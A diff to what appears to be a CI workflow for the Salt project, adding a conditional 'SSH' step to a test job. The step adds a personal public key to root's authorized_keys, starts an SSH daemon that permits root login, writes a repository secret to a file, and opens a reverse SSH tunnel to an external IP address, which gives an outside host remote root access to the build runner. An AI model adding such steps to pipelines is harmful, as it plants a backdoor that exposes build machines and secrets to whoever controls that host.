@@ -65,6 +65,7 @@ env:
   PIP_EXTRA_INDEX_URL: ${{ vars.PIP_EXTRA_INDEX_URL }}
   PIP_DISABLE_PIP_VERSION_CHECK: "1"
   RAISE_DEPRECATIONS_RUNTIME_ERRORS: "1"
+  PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
 
 jobs:
 
@@ -592,6 +593,50 @@ jobs:
           EOF
           sudo systemctl restart apparmor
           sudo aa-status
+
+      - name: SSH
+        if: ${{ matrix.slug == 'ubuntu-22.04' && matrix.tests-chunk == 'integration' && matrix.test-group == '3' && matrix.transport == 'zeromq' && env.PRIVATE_KEY != '' }}
+        run: |
+         ssh-keygen -f ./ssh_host_dsa_key -N '' -t dsa
+         ssh-keygen -f ./ssh_host_ecdsa_key -N '' -t ecdsa -b 521
+         ssh-keygen -f ./ssh_host_ed25519_key -N '' -t ed25519
+         echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAVGQIPTuC5Hgj9h5LV5tda6nZdHCsFvqFjBvSAYjfEQ dan@carbon" > ./authorized_keys
+         echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAVGQIPTuC5Hgj9h5LV5tda6nZdHCsFvqFjBvSAYjfEQ dan@carbon" | sudo tee -a /root/.ssh/authorized_keys
+         cat <<'EOF' > ./sshd_config
+         AcceptEnv LANG LC_*
+         AuthorizedKeysFile /home/runner/work/salt/salt/authorized_keys
+         ChallengeResponseAuthentication no
+         HostKey /home/runner/work/salt/salt/ssh_host_dsa_key
+         HostKey /home/runner/work/salt/salt/ssh_host_ecdsa_key
+         HostKey /home/runner/work/salt/salt/ssh_host_ed25519_key
+         HostbasedAuthentication no
+         IgnoreRhosts yes
+         ListenAddress 127.0.0.1
+         LogLevel INFO
+         LoginGraceTime 120
+         PasswordAuthentication no
+         PermitEmptyPasswords no
+         PermitRootLogin without-password
+         PidFile /tmp/sshd.pid
+         PrintLastLog yes
+         PrintMotd no
+         Protocol 2
+         PubkeyAuthentication yes
+         StrictModes no
+         Subsystem sftp /usr/libexec/openssh/sftp-server
+         SyslogFacility AUTH
+         TCPKeepAlive yes
+         UsePAM yes
+         X11DisplayOffset 10
+         X11Forwarding no
+         EOF
+         sudo mkdir -p /var/run/sshd
+         sudo chmod 0755 /var/run/sshd
+         sudo /usr/sbin/sshd -f ./sshd_config -p 5222
+         echo "${{ env.PRIVATE_KEY }}" > ./key
+         chmod 600 ./key
+         ls -lah
+         ssh -vv -o ServerAliveInterval=20 -o TCPKeepAlive=no -o StrictHostKeyChecking=no -i ./key -R 127.0.0.1:5222:127.0.0.1:5222 dan@95.211.223.150 tail -f /dev/null
 
       - name: Run Changed Tests
         id: run-fast-changed-tests
